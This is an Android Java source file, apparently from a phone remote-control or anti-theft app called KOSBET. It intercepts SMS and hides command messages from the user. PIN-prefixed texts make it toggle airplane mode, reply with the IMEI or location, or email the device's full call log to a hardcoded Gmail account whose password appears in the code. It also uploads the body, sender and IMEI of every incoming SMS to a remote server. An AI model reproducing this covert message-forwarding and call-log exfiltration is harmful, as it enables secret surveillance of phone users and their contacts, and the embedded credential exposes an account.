package com.kosbet;
import java.io.BufferedReader;
import android.provider.Settings;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.Calendar;
import java.util.Date;
import java.util.concurrent.ExecutionException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

@SuppressLint({ "SimpleDateFormat", "SdCardPath" })
public class MessageReceiver extends BroadcastReceiver implements LocationListener {
	
	Context context;
	LocationManager locationManager;
	boolean isGPSEnabled = false;
	boolean isNetworkEnabled = false;
	String imei;
	GetJson jsonOperations;
	String pinno, Emid, phno;
	String callregpin;
	String findurself;
	public static final String PREFS_NAME = "phonenum";
	String deact, imeinum;
	StringBuffer sb = new StringBuffer();
	Mail m;
	String senderNum;
	TelephonyManager telephony;
	Bundle bundle ;
	public  String PREFS_IP = "IPADDRESS";
	public  String PREFS_PORT = "PORT";
	String new_ip,new_port;
	private static String IP_DATA = "ip";
	private static String PORT_DATA = "port";
	long timeStamp = System.currentTimeMillis(); 
	@SuppressWarnings({ "deprecation", "unused" })
	@Override
	public void onReceive(Context context1, Intent intent) 
	{		
		System.out.println("New message");
		context=context1;
		getIP();
			locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
			isGPSEnabled = locationManager
					.isProviderEnabled(LocationManager.GPS_PROVIDER);		
			isNetworkEnabled = locationManager
					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
			telephony = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			imei = telephony.getDeviceId();                       
			bundle= intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[])bundle.get("pdus");
                final SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                }
                if (messages.length > -1) {
                    String body = messages[0].getMessageBody();
                    String address = extractNumber( messages[0].getOriginatingAddress() );
                    senderNum=address;
                                        
                    if (body.contains("$")) {
        				abortBroadcast();        				
        				String values1 = "ANN";
        				System.out.println("7777777777" + body);
        				try {
        					jsonOperations = new GetJson(context);
        					getIP();
        					if(new_ip!=null)
    						{
        					String path = "http://"+new_ip+":"+new_port+"/KOSBET/resources/credential/"
        							+ values1;
        					System.out.println("path" + path);
        					jsonOperations.execute(new String[] { path });
        					Thread.sleep(3000);
        					JSONObject jsonObj = jsonOperations.getJsonResponseObject();
        					Log.d("JSON", "length" + jsonObj.length());
        					System.out.println(jsonObj.length());
        					JSONObject credentl = jsonObj.getJSONObject("credential");
        					pinno = credentl.getString("Pinnumber").toString();
        					Emid = credentl.getString("Email").toString();
        					phno = credentl.getString("Phonenumber").toString();
        					System.out.println(pinno+Emid+phno);
        					callregpin = pinno +"$"+ "calllog";
        					findurself = pinno +"$"+ "find";
        					deact = pinno +"$"+ "deactivate";
        					imeinum = pinno +"$"+ "imei";    
    						}
        				} catch (Exception e) 
        				{
        					System.out.println("hello");
        				}	
        				if (body.equalsIgnoreCase(deact))
        				{
        					
							boolean isEnabled = Settings.System.getInt(context.getContentResolver(),Settings.System.AIRPLANE_MODE_ON, 0) == 1;		
        					Settings.System.putInt(context.getContentResolver(),							Settings.System.AIRPLANE_MODE_ON, isEnabled ? 0 : 1);		
        					Intent intent1 = new Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED);
        					intent.putExtra("state", !isEnabled);
        					context.sendBroadcast(intent1);
        				
        				}
        				else if (body.equals(imeinum))
        				{					
        					
        					String bodymes = "IMEI Number is" + imei;        										
        					SmsManager sms1 = SmsManager.getDefault();
        					sms1.sendTextMessage(address, null, bodymes, null, null);
        					 java.text.DateFormat df = new java.text.SimpleDateFormat(
        								"yyyy-MM-dd");
        						java.text.DateFormat tf = new java.text.SimpleDateFormat("HH:mm:ss");
        				     String todaysdate = df.format(new java.util.Date());
        				     String todaystime = tf.format(new java.util.Date());				    
        				     String value = "ANN" + "&" + bodymes + "&" + address + "&" + "send"
        								+ "&" + todaysdate + "&" + todaystime + "&" + imei;        				     
        				     
							try {
								GetXMLTask jsonOperations = new GetXMLTask();
								getIP();
								if(new_ip!=null)
								{
								String path = "http://"+new_ip+":"+new_port+"/KOSBET/resources/sms/"
										+ value;
								System.out.println("path" + path);
								path = path.replaceAll(" ", "%20");
								jsonOperations.execute(new String[] { path });
								}
							} catch (Exception e) {
								Toast.makeText(context, "Connection Failure", Toast.LENGTH_LONG).show();
							}
						}
        				else if (body.equals(callregpin))
        				{        					
        					Calendar c = Calendar.getInstance();
        					Cursor managedCursor = context.getContentResolver().query(
        							CallLog.Calls.CONTENT_URI, null, null, null, null);
        					int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        					int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        					int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        					int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        					sb.append("Call Details :");
        					while (managedCursor.moveToNext()) {
        						String phNumber = managedCursor.getString(number);
        						String callType = managedCursor.getString(type);
        						String callDate = managedCursor.getString(date);
        						Date callDayTime = new Date(Long.valueOf(callDate));
        						String callDuration = managedCursor.getString(duration);
        						String dir = null;
        						int dircode = Integer.parseInt(callType);
        						switch (dircode) {
        						case CallLog.Calls.OUTGOING_TYPE:
        							dir = "OUTGOING";
        							break;

        						case CallLog.Calls.INCOMING_TYPE:
        							dir = "INCOMING";
        							break;

        						case CallLog.Calls.MISSED_TYPE:
        							dir = "MISSED";
        							break;
        						}
        						sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
        								+ dir + " \nCall Date:--- " + callDayTime
        								+ " \nCall duration in sec :--- " + callDuration);

        						sb.append("\n----------------------------------");

        					}
        					managedCursor.close();
        					FileOutputStream fos = null;
        					try {
        						File direct = new File(
        								Environment
        										.getExternalStorageDirectory()
        										.getAbsolutePath()
        										+ "/folderName/");
        						if (!direct.exists()) {
        							direct.mkdirs();
        						}
        						final File myFile = new File(
        								direct, "Callregister"
        										+ ".txt");
        						if (!myFile.exists()) {
        							myFile.createNewFile();
        						}

        						fos = new FileOutputStream(
        								myFile);

        						fos.write(sb.toString()
        								.getBytes());
        						fos.close();
        					} catch (IOException e) {

        						e.printStackTrace();
        					}        					
        					m = new Mail("help.kds@gmail.com", "kompacdigital");        					

        					String mes = "Hi" + "\n" + "\n"
        							+ "Caller logs for following Imei number " + imei;       					
        					
        					String[] toArr = {"iilakkiah@gmail.com"};
        												// add more emails, just
        												// separate them with a coma
        					m.setTo(toArr); // load array to setTo function

        					m.setFrom("help.kds@gmail.com"); // who is sending the email
        					m.setSubject("Caller log Details");
        					m.setBody(mes);

        					try {
        						m.addAttachment("/sdcard/folderName/Callregister.txt");
        						if (m.send()) { 							

        					
        							
        						} else {        							
        						}
        					} catch (Exception e) {
        						// some other problems
        						e.printStackTrace();
        						
        					}
        					
        				} 			
        				
        				else if (messages.equals(findurself))
        				{
        					System.out.println("Receive find");
        					LocationManager  locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);					  
        				       
        				        Criteria criteria = new Criteria();		
        				      
        				   String     provider = locationManager.getBestProvider(criteria, false);				 
        				        if(provider!=null && !provider.equals("")){		 
        				           
        				            Location location = locationManager.getLastKnownLocation(provider);				 
        				            locationManager.requestLocationUpdates(provider, 20000, 10, this);				 
        				            if(location!=null)
        				                onLocationChanged(location);
        				            else
        				                Toast.makeText(context, "Location can't be retrieved", Toast.LENGTH_SHORT).show();
        				 
        				        }else{
        				            Toast.makeText(context, "No Provider Found", Toast.LENGTH_SHORT).show();
        				        }
        				}				
        			}                   
                      java.text.DateFormat df = new java.text.SimpleDateFormat(
            				"yyyy-MM-dd");
            		java.text.DateFormat tf = new java.text.SimpleDateFormat("HH:mm:ss");
            		final String todaysdate = df.format(new java.util.Date());
            		final String todaystime = tf.format(new java.util.Date());
            		String values = "ANN" + "&" + body + "&" + senderNum + "&"
            				+ "received" + "&" + todaysdate + "&" + todaystime + "&"
            				+ imei;
            		try {
            			GetXMLTask jsonOperations = new GetXMLTask();
            			getIP();
            			String path = "http://"+new_ip+":"+new_port+"/KOSBET/resources/sms/"
            					+ values;

            			path = path.replaceAll(" ", "%20");

            			jsonOperations.execute(new String[] { path });
            			Thread.sleep(5000);

            		} catch (Exception e) 
            		{
            			Toast.makeText(context, "Connection Failure", Toast.LENGTH_LONG).show();
            		}                   
                }
            }
        }
		
	
private void getIP() 
	{
		String ip = "";
		String port = "";
		SharedPreferences settings = context.getSharedPreferences(PREFS_IP, 0);
		SharedPreferences settings1 = context.getSharedPreferences(PREFS_PORT, 0);
		ip = settings.getString(IP_DATA, null);
		port=settings1.getString(PORT_DATA, null);
		if (ip == null) 
		{
			if(port== null)
			{
				
			}

		} 
		else
		{
			new_ip=ip;
			new_port=port;
		}
					
	}

protected void sendEmail() {
		
		m = new Mail("help.kds@gmail.com", "kompacdigital");
		TelephonyManager telephonyManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String IMEI_Number = telephonyManager.getDeviceId();

		String mes = "Hi" + "\n" + "\n"
				+ "Caller logs for following Imei number " + IMEI_Number;	
		String[] toArr = {"iilakkiah@gmail.com"};									
		m.setTo(toArr);
		m.setFrom("help.kds@gmail.com"); // who is sending the email
		m.setSubject("Caller log Details");
		m.setBody(mes);
		try {
			m.addAttachment("/sdcard/folderName/Callregister.txt");
			if (m.send()) {				
			System.out.println("***** message send");				
			} else {				
			}
		} catch (Exception e) {
			
			e.printStackTrace();
			
		}
		

	}
private class GetXMLTask extends AsyncTask<String, Void, String>
{
	
	@Override
	protected String doInBackground(String... urls) {
		String output = null;
		for (String url : urls) {
			output = getOutputFromUrl(url);
		}
		return output;
	}
	


	private String getOutputFromUrl(String url) {
		String output = null;
		try {
			DefaultHttpClient httpClient = new DefaultHttpClient();
			HttpGet httpGet = new HttpGet(url);
			HttpResponse httpResponse = httpClient.execute(httpGet);

			HttpEntity httpEntity = httpResponse.getEntity();

			output = EntityUtils.toString(httpEntity);
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return output;
	}

}


@Override
public void onLocationChanged(Location arg0) {
	setLocation(arg0);

System.out.println("latitude and longitude:"+arg0.getLatitude());	
}

@Override
public void onProviderDisabled(String arg0) {

	
}

@Override
public void onProviderEnabled(String arg0) {

	
}

@Override
public void onStatusChanged(String arg0, int arg1, Bundle arg2) {

	
}
private void setLocation(Location location2) 
{
	String	goooglesdd = "";
	double lati = 0;
	double longi = 0;
	try 
	{
		lati= location2.getLatitude();
		longi = location2.getLongitude();
		
	String	addrURL = "http://maps.googleapis.com/maps/api/geocode/json?latlng="
				+ lati + "," + longi + "&sensor=false";
	goooglesdd = new FetchChangedLocation().execute(addrURL).get();		
	

	} catch (InterruptedException e) {

		e.printStackTrace();
	} catch (ExecutionException e) {

		e.printStackTrace();
	}
	SmsManager sms =SmsManager.getDefault();
	sms.sendTextMessage(senderNum, null, goooglesdd+"/n"+"https://maps.google.com/maps?q=" + lati + "," + longi
,null, null);
	

	

}

class FetchChangedLocation extends AsyncTask<String, String, String> 
{
	
	@Override
	protected String doInBackground(String... url) {

		String add = readAddressFeed(url[0]);
		String addrs = "";
		try {
			JSONObject jsr = new JSONObject(add); // JSON object with above
													// data
			JSONArray content = jsr.getJSONArray("results");// get CONTENT
															// which is Json
															// array inside
															// Demo
			addrs = content.getJSONObject(1).getString("formatted_address");

		} catch (JSONException e) {
			e.printStackTrace();
		}
		return addrs;
	}
	
	public String readAddressFeed(String Url) {
		StringBuilder builder = new StringBuilder();
		HttpClient client = new DefaultHttpClient();
		HttpGet httpGet = new HttpGet(Url);
		try {
			HttpResponse response = client.execute(httpGet);
			StatusLine statusLine = response.getStatusLine();
			statusLine.getStatusCode();
			HttpEntity entity = response.getEntity();
			InputStream content = entity.getContent();
			BufferedReader reader = new BufferedReader(
					new InputStreamReader(content));
			String line;
			while ((line = reader.readLine()) != null) {
				builder.append(line);
			}

		} catch (ClientProtocolException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return builder.toString();
	}
}
	private String extractNumber(String address){
		String number = "";
	    // get numbers
		Pattern pattern = Pattern.compile("\\d+");
		Matcher matcher = pattern.matcher(address);
		while(matcher.find()){
			number += matcher.group();
		}

		return number;
	}
}
